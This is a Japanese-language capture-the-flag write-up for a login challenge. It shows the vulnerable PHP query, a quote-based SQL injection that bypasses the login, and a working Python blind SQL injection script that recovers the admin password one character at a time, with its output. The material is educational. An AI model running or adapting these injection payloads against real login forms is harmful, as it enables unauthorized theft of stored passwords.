
# Q6 Login

## 問題URL 
http://ctfq.sweetduet.info:10080/~q6/
## 概要
IDとPASSの入力フォームがある。`First, login as "admin". ` とメッセージが表示されている。

### SQLインジェクションしてみる
IDに`admin`、PASSに`' OR 'hoge' == 'hoge` を入力して送信。

すると以下のメッセージが表示される。フラグはadminのパスワードらしい。

Congratulations!  
It's too easy?  
Don't worry.
The flag is admin's password.

Hint:

```
function h($s){return htmlspecialchars($s,ENT_QUOTES,'UTF-8');}

$id = isset($_POST['id']) ? $_POST['id'] : '';
$pass = isset($_POST['pass']) ? $_POST['pass'] : '';
$login = false;
$err = '';

if ($id!=='')
{
    $db = new PDO('sqlite:database.db');
    $r = $db->query("SELECT * FROM user WHERE id='$id' AND pass='$pass'");
    $login = $r && $r->fetch();
    if (!$login)
        $err = 'Login Failed';
}
```

## ブラインドSQLについて
ブラインドSQLインジェクションはクエリの結果が表示されない場合に、SQLインジェクションによりデータを盗みだす手法。  
一文字ずつ結果をチェックしていくことで表示されないデータを割り出すことができる。


```python
import urllib

def blindSQL(sql):
    url = 'http://ctfq.sweetduet.info:10080/~q6/'
    payload = {
        'id' : sql,
        'pass' : 'hogehoge'
    }
    payload=urllib.parse.urlencode(payload)
    payload = payload.encode('ascii')
    response = urllib.request.urlopen(url,payload)
    
    return urllib.request.urlopen(url,payload)
```

### パスワード長の特定
以下のスクリプトでパスワード長を特定する。  
正解判定は先程のインジェクション成功時の文字列長(ほどほどに長ければなんでも良い)


```python
for i in range(1, 100):
    sql = 'admin\' AND (SELECT LENGTH(pass) FROM user WHERE id = \'admin\') = {counter} --'.format(counter = i)
    response = blindSQL(sql)
    if len(response.read()) > 2000:
        print('length of the password is {counter}'.format(counter = i))
        break
```

    length of the password is 21


これによりパスワード長は21と判明。  
次に一文字ずつパスワードを調べていく。  
文字コードの対応は以下の通り


```python
text=''
for i in range(48,123):
    text+=chr(i)
text
```




    '0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz'




```python
for index in range(1, 22):
    for char_number in range(48, 123):
        char = chr(char_number)
        sql = 'admin\' AND SUBSTR((SELECT pass FROM user WHERE id = \'admin\'), {index}, 1) = \'{char}\' --'.format(index = index, char = char)
        response = blindSQL(sql)
        if len(response.read()) > 2000:
            print(char, end="")
            break
```

    FLAG_KpWa4ji3uZk6TrPK

## SQL構文
### SELECT文
`SELECT フィールド名(カラム名) FROM テーブル名`
### WHERE文
任意のフィールドから、条件にマッチしたデータのみを取得する  
`SELECT フィールド名(カラム名) FROM テーブル名 WHERE 条件式`
### SUBSTR文
文字列から指定した箇所を抽出する  
`SUBSTR 文字列　開始位置、抽出文字数`

## 参考URL
https://qiita.com/__k_onishi__/items/f0e8d6c8f0b6c6974ed9
